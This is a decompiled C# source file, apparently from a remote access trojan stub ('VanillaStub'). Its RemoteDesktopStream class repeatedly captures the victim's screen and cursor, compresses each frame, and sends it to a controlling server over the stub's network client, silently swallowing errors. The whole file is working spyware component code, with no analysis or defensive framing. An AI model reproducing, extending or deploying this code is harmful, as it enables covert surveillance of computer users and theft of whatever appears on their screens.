using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Threading;
using System.Windows.Forms;
using VanillaStub.Helpers.Networking;
using VanillaStub.Helpers.Services.StreamLibrary;
using VanillaStub.Helpers.Services.StreamLibrary.UnsafeCodecs;

namespace VanillaStub.Helpers.Services;

public static class RemoteDesktopStream
{
	private struct CursorInfo
	{
		public int cbSize;

		public readonly int flags;

		public readonly IntPtr hCursor;

		public readonly PointAPI ptScreenPos;
	}

	private struct PointAPI
	{
		public readonly int x;

		public readonly int y;
	}

	private const int CURSOR_SHOWING = 1;

	private static Thread RemoteDestkopThread = new Thread(StartRemoteDestkop);

	public static bool RemoteDesktopActive { get; set; }

	[DllImport("user32.dll")]
	private static extern bool GetCursorInfo(out CursorInfo pci);

	[DllImport("user32.dll")]
	private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Start()
	{
		if (!RemoteDesktopActive)
		{
			RemoteDesktopActive = true;
			try
			{
				StartRemoteDestkop();
			}
			catch
			{
			}
		}
	}

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Stop()
	{
		if (RemoteDesktopActive)
		{
			RemoteDesktopActive = false;
			try
			{
				RemoteDestkopThread.Abort();
				RemoteDestkopThread = new Thread(StartRemoteDestkop);
			}
			catch
			{
			}
		}
	}

	private static async void StartRemoteDestkop()
	{
		while (RemoteDesktopActive)
		{
			byte[] ImageBytes = null;
			IUnsafeCodec UC = new UnsafeStreamCodec(50);
			Bitmap Image = GetDesktopImage();
			Rectangle Rect = new Rectangle(0, 0, ((Image)Image).get_Width(), ((Image)Image).get_Height());
			Size S = new Size(((Image)Image).get_Width(), ((Image)Image).get_Height());
			BitmapData BD = Image.LockBits(new Rectangle(0, 0, ((Image)Image).get_Width(), ((Image)Image).get_Height()), (ImageLockMode)3, ((Image)Image).get_PixelFormat());
			using (MemoryStream MS = new MemoryStream(1000000000))
			{
				UC.CodeImage(BD.get_Scan0(), Rect, S, ((Image)Image).get_PixelFormat(), MS);
				ImageBytes = MS.ToArray();
			}
			List<byte> ToSend = new List<byte>();
			ToSend.Add(0);
			ToSend.AddRange(ImageBytes);
			VanillaStub.Helpers.Networking.Networking.MainClient.Send(ToSend.ToArray());
			Image.UnlockBits(BD);
			((Image)Image).Dispose();
		}
	}

	private static Bitmap GetDesktopImage()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
		try
		{
			Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(0, 0, 0, 0, new Size(((Image)val).get_Width(), ((Image)val).get_Height()), (CopyPixelOperation)13369376);
			CursorInfo pci = default(CursorInfo);
			pci.cbSize = Marshal.SizeOf(typeof(CursorInfo));
			if (GetCursorInfo(out pci) && pci.flags == 1)
			{
				DrawIcon(val2.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
				val2.ReleaseHdc();
			}
			val2.Dispose();
			return val;
		}
		catch
		{
			return new Bitmap(bounds.Width, bounds.Height);
		}
	}
}
